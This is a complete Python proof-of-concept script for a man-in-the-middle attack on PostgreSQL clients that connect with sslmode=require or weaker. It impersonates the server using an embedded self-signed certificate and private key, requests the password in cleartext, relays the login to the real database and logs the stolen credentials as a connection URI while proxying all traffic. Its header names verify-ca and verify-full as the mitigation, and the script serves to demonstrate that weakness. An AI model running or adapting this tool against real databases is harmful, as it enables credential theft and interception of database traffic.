#!/usr/bin/env python

from __future__ import print_function

# This script demonstrates how to setup a Man-in-the-Middle (MitM) attack on a
# Postgres connection with SSLMODE=require or less. Attack is mitigated by
# setting SSLMODE=verify-ca or SSLMODE=verify-full, which requires you to get
# the certificate of either your server or a CA that has signed it's
# certificate.

# What the script does:
# * Bind to 5432 and listen for incoming connections
# * If someone connects over plaintext, request password to be sent in the clear
# * If someone requests to connect over SSL, initiate the SSL connection with a
#   self-signed certificate, then ask for password in plaintext
# * Initiate TLS connection to actual database with the supplied credentials
# * Proxy all traffic between the client and the actual database

# The target database must be given as an argument on the command line.

# PS: Please don't look to this script for examples of how to write good socket
# code, this is just a proof of concept.

import argparse
import hashlib
import logging
import os
import select
import socket
import ssl
import struct
import sys
import tempfile
import textwrap
import threading
import time
from collections import namedtuple

# Sent by client when requesting TLS connection (this is the magic version
# 1234.5679 of the protocol, defined in pgcomm.h)
VERSION_SSL = b'\x04\xd2\x16\x2f'
VERSION_3   = b'\x00\x03\x00\x00'
SSL_STARTUP_RESPONSE = b'S'
PY2 = sys.version_info < (3, 0, 0)

_logger = logging.getLogger(__name__)


# Lifted from pqcomm.h
AUTH_METHODS = {
    'AUTH_REQ_OK':          0,   # User is authenticated
    'AUTH_REQ_KRB4':        1,   # Kerberos V4. Not supported any more.
    'AUTH_REQ_KRB5':        2,   # Kerberos V5. Not supported any more.
    'AUTH_REQ_PASSWORD':    3,   # Password
    'AUTH_REQ_CRYPT':       4,   # crypt password. Not supported any more.
    'AUTH_REQ_MD5':         5,   # md5 password
    'AUTH_REQ_SCM_CREDS':   6,   # transfer SCM credentials
    'AUTH_REQ_GSS':         7,   # GSSAPI without wrap()
    'AUTH_REQ_GSS_CONT':    8,   # Continue GSS exchanges
    'AUTH_REQ_SSPI':        9,   # SSPI negotiate without wrap()
}

AUTH_METHODS_REVERSE = {val: key for key, val in AUTH_METHODS.items()}

CERTIFICATE = textwrap.dedent('''\
    -----BEGIN CERTIFICATE-----
    MIIBFTCBvQIJAOVlsttuSJP1MAoGCCqGSM49BAMCMBUxEzARBgNVBAMMCnNlbGZz
    aWduZWQwHhcNMTYwNTI5MTg0NDAzWhcNMjYwNTI3MTg0NDAzWjAVMRMwEQYDVQQD
    DApzZWxmc2lnbmVkMFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAER28qhX8p79zv7x0G
    Mkqef7KfDXgmobUfcUKhmt5Eqn+8GnraVjvrzAs+6jMcLemUj1+dLbkmFKMtFolA
    f0EDbjAKBggqhkjOPQQDAgNHADBEAiAD1hIlVDGKtKkRyCZISZ/UteZ1hBzaX00Q
    g6qnOtZlcgIgCWlME+pNLmaSeMVx7unb6zFGNhDzfxeSSJEM5tlCGZs=
    -----END CERTIFICATE-----

    -----BEGIN EC PARAMETERS-----
    BgUrgQQACg==
    -----END EC PARAMETERS-----
    -----BEGIN EC PRIVATE KEY-----
    MHMCAQEEHyXy23774hq9CTorIFwGuppBUlXIZN0eOsjruDkJopigBwYFK4EEAAqh
    RANCAARHbyqFfynv3O/vHQYySp5/sp8NeCahtR9xQqGa3kSqf7waetpWO+vMCz7q
    Mxwt6ZSPX50tuSYUoy0WiUB/QQNu
    -----END EC PRIVATE KEY-----
    ''')


def main():
    args = get_args()
    configure_logger(args.logging_level)
    target_backend = args.backend

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
    sock.bind(('0.0.0.0', args.port))

    # max queued connections
    backlog = 5

    sock.listen(backlog)
    _logger.info('Listening for connections')

    # Maintain a reference to running threads to enable stopping them when the
    # script terminates
    threads = set()

    last_check_for_stopped_threads = time.time()

    try:
        cert_file = tempfile.NamedTemporaryFile(delete=False)
        with cert_file:
            cert_file.write(CERTIFICATE.encode('utf-8'))
        while True:
            client_socket, address = sock.accept()
            client_handler = ClientConnection(client_socket, target_backend,
                cert_file.name)
            client_handler.start()

            threads.add(client_handler)
            if time.time() - last_check_for_stopped_threads > 3:
                remove_stopped_threads(threads)

    except (KeyboardInterrupt, SystemExit):
        _logger.info('Received exit, shutting down')
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
        stop_threads(threads)
        os.remove(cert_file.name)


def get_args():
    parser = argparse.ArgumentParser('postgres-mitm')
    parser.add_argument('backend')
    parser.add_argument('-l', '--logging-level',
        choices=('debug', 'info', 'warning'), default='info')
    parser.add_argument('-p', '--port', default=5432, type=int,
        help='The local port to bind to. Default: %(default)s')
    return parser.parse_args()


def configure_logger(level):
    logging.basicConfig(format='%(asctime)-15s [%(levelname)s] %(message)s')
    _logger.setLevel(getattr(logging, level.upper()))


def remove_stopped_threads(threads):
    threads_to_remove = []
    for thread in threads:
        if thread.stopped:
            threads_to_remove.append(thread)
    for thread in threads_to_remove:
        threads.remove(thread)


def stop_threads(threads):
    for thread in threads:
        thread.stop()


class ClientConnection(threading.Thread):

    def __init__(self, client_socket, target_backend, cert_file):
        super(ClientConnection, self).__init__()
        for proto in ('PROTOCOL_TLSv1_2', 'PROTOCOL_TLSv1', 'PROTOCOL_SSLv23'):
            protocol = getattr(ssl, proto, None)
            if protocol:
                break
        self.ssl_context = ssl.SSLContext(protocol)
        self.ssl_context.load_cert_chain(certfile=cert_file)
        self.socket = client_socket
        self.target_backend = target_backend
        self.server_socket = None
        self._stop = threading.Event()


    def stop(self):
        self._stop.set()


    @property
    def stopped(self):
        return self._stop.isSet()


    def run(self):
        buffer_size = 4096
        try:
            self.initiate_client_and_server_connections()
            _logger.debug('Initiated')
            while not self.stopped:
                timeout = 0
                sockets = [self.server_socket, self.socket]
                sockets_with_data = select.select(sockets, [], [], timeout)[0]
                if self.socket in sockets_with_data:
                    data = self.socket.recv(buffer_size)
                    _logger.debug('Client -> Server: %s' % repr(data))
                    if data:
                        self.server_socket.send(data)
                    else:
                        self.socket.close()
                        self.server_socket.shutdown(socket.SHUT_RDWR)
                        self.server_socket.close()
                        break
                if self.server_socket in sockets_with_data:
                    data = self.server_socket.recv(buffer_size)
                    _logger.debug('Server -> Client: %s' % repr(data))
                    if data:
                        self.socket.send(data)
                    else:
                        self.socket.shutdown(socket.SHUT_RDWR)
                        self.socket.close()
                        self.server_socket.shutdown(socket.SHUT_RDWR)
                        self.server_socket.close()
        except ssl.SSLError as exc:
                if exc.reason == 'TLSV1_ALERT_UNKNOWN_CA':
                    _logger.info('Client had an established trust root, could'
                        ' not intercept details.')
                else:
                    _logger.info('Got TLS error when establishing connection: %s', exc.strerror)
                    raise
        except Exception as exc:
            _logger.exception('Got exception during protocol handling: %s' % exc)
        finally:
            self.terminate()


    def initiate_client_and_server_connections(self):
        # wait for startup packet
        first_client_packet = self.wait_for_client_ssl_or_startup_packet()
        requested_protocol_version = first_client_packet[4:8]

        if requested_protocol_version == VERSION_SSL:
            _logger.debug('Got SSL startup request')
            self.send_to_client(SSL_STARTUP_RESPONSE)
            self.listen_for_tls_handshake()
            startup_packet = self.wait_for_client_ssl_or_startup_packet()
            self.handle_startup_packet(startup_packet)
        elif requested_protocol_version == VERSION_3:
            # Didn't request SSL, totally fine for us, just request plaintext
            # auth and grab the credentials
            _logger.debug('Initiating plaintext connection')
            self.handle_startup_packet(first_client_packet)
        else:
            # Invalid first packet, abort the connection
            self.terminate()
            return

        auth_request = self.wait_for_auth_request()
        if not self.handle_authentication_request(auth_request):
            raise Exception('Backend auth failed')


    def wait_for_client_ssl_or_startup_packet(self):
        # Either SSL request or startup is the first packet sent, both has the
        # format <int32 length><int32 protocol>[<other>]

        # Read first 8 bytes to get tag and length of packet
        first_8_bytes = self.read_n_bytes_from_client(8)

        # Startup messages and SSL requests start with length of message in
        # the first four bytes
        msg_length = struct.unpack('!I', first_8_bytes[:4])[0]

        rest_of_message = self.read_n_bytes_from_client(msg_length - 8)

        return first_8_bytes + rest_of_message


    def wait_for_auth_request(self):
        # Format of message is <char tag><int32 len><message>
        first_5_bytes = self.read_n_bytes_from_client(5)
        tag = first_5_bytes[0:1]
        if tag != b'p':
            raise Exception("Received non-auth request: %s" % tag)

        # Bump length with 1 to offset for tag
        msg_length = struct.unpack('!I', first_5_bytes[1:])[0] + 1
        _logger.debug('Reading auth request, waiting for %d bytes' % msg_length)

        rest_of_message = self.read_n_bytes_from_client(msg_length - 5)
        return first_5_bytes + rest_of_message


    def read_n_bytes_from_client(self, n):
        return read_n_bytes_from_socket(self.socket, n)


    def read_n_bytes_from_server(self, n):
        return read_n_bytes_from_socket(self.server_socket, n)


    def send_to_client(self, msg):
        bytes_sent = 0
        while bytes_sent < len(msg):
            sent = self.socket.send(msg[bytes_sent:])
            if sent == 0:
                raise Exception('Client socket closed')
            bytes_sent += sent


    def handle_startup_packet(self, data):
        self.startup_packet = data
        self.options = parse_options_from_startup_packet(data)
        _logger.debug('Startup packet processed successfully: %s' % self.options)
        length = struct.pack('!I', 8)
        method = struct.pack('!I', AUTH_METHODS['AUTH_REQ_PASSWORD'])
        auth_reply = b'R' + length + method
        _logger.debug('Replying to startup: %s' % repr(auth_reply))
        self.socket.send(auth_reply)
        return True


    def handle_authentication_request(self, data):
        _logger.debug('Got auth response packet: %s' % repr(data))

        password = parse_password_from_authentication_packet(data)
        if self.connect_to_actual_backend(password):
            captured_uri = 'postgres://%(user)s:%(password)s@%(host)s:5432/%(database)s' % {
                'user': self.options.get('user', b'').decode('utf-8'),
                'password': password.decode('utf-8'),
                'host': self.target_backend,
                'database': self.options.get('database', b'').decode('utf-8'),
            }
            _logger.info('Intercepted auth: %s' % captured_uri)
            # Switch socket to non-blocking to enable messages to pass in
            # arbitrary order
            self.socket.setblocking(0)
        else:
            return False
        return True


    def connect_to_actual_backend(self, password):
        self.server_socket = socket.create_connection((self.target_backend, 5432))
        length = struct.pack('!I', 8)
        packet = length + VERSION_SSL
        self.server_socket.sendall(packet)
        data = read_n_bytes_from_socket(self.server_socket, 1)
        assert data == b'S'
        self.server_socket = self.ssl_context.wrap_socket(self.server_socket)
        self.server_socket.do_handshake()
        self.server_socket.sendall(self.startup_packet)
        raw_auth_request = self.receive_auth_request_from_backend()
        _logger.debug('Got auth request: %s' % repr(raw_auth_request))
        auth_request = parse_auth_request_packet(raw_auth_request)
        if auth_request.method == 'AUTH_REQ_MD5':
            # options is 4-byte salt
            salt = auth_request.options
            response = create_md5_auth_packet(self.options.get('user', b''), password, salt)
            self.server_socket.sendall(response)
        else:
            _logger.debug('Unsupported backend auth method: %s' % auth_request.method)
            return False

        # Make socket non-blocking
        self.server_socket.setblocking(0)

        return True


    def receive_auth_request_from_backend(self):
        first_9_bytes = self.read_n_bytes_from_server(9)
        assert first_9_bytes[0:1] == b'R'
        packet_length = struct.unpack('!I', first_9_bytes[1:5])[0]
        # Tag doesn't count on length, read the rest
        the_rest = self.read_n_bytes_from_server(packet_length - 8)
        return first_9_bytes + the_rest


    def listen_for_tls_handshake(self):
        self.socket = self.ssl_context.wrap_socket(self.socket, server_side=True)


    def terminate(self):
        _logger.debug('Terminating thread')
        for sock in (self.socket, self.server_socket):
            if not sock:
                continue
            try:
                sock.close()
            except:
                _logger.exception('Got exception when trying to close socket')
        self.stop()


def socket_is_closed(sock):
    return isinstance(sock._sock, socket._closedsocket)


def read_n_bytes_from_socket(sock, n):
    buf = bytearray(n)
    view = memoryview(buf)
    while n:
        nbytes = sock.recv_into(view, n)
        view = view[nbytes:] # slicing views is cheap
        n -= nbytes
    return buf


def create_md5_auth_packet(username, password, salt):
    pw_and_username = password + username
    pw_hash = hashlib.md5(pw_and_username).hexdigest()
    salted_hash = 'md5' + hashlib.md5(pw_hash.encode('utf-8') + salt).hexdigest()
    # 32 bytes of digest, four bytes length, 3 bytes for 'md5', one byte terminating null
    length = struct.pack('!I', 40)
    return b'p' + length + salted_hash.encode('utf-8') + b'\x00'


def parse_options_from_startup_packet(data):
    # format is <in32 length><in32 protocol>[<key>\0<value>\0]+\0
    raw_key_value_pairs = data[8:]
    assert raw_key_value_pairs[-1] == 0
    raw_key_value_pairs = raw_key_value_pairs[0:-1]
    if PY2:
        assert raw_key_value_pairs.count('\0') % 2 == 0
    else:
        assert raw_key_value_pairs.count(0) % 2 == 0

    options = {}
    key_value_pairs = data[8:].split(b'\x00')
    for i in range(0, len(key_value_pairs), 2):
        key = key_value_pairs[i]
        value = key_value_pairs[i + 1]
        options[key.decode('utf-8')] = value

    return options


def parse_password_from_authentication_packet(data):
    assert data[-1] == 0
    return data[5:-1]


def parse_auth_request_packet(data):
    # format is R<int32 length><int32 method>[<options>]
    method = struct.unpack('!I', data[5:9])[0]
    assert method in AUTH_METHODS_REVERSE
    textual_method = AUTH_METHODS_REVERSE[method]
    AuthRequest = namedtuple('AuthRequest', 'method options')
    return AuthRequest(textual_method, data[9:])


if __name__ == '__main__':
    main()
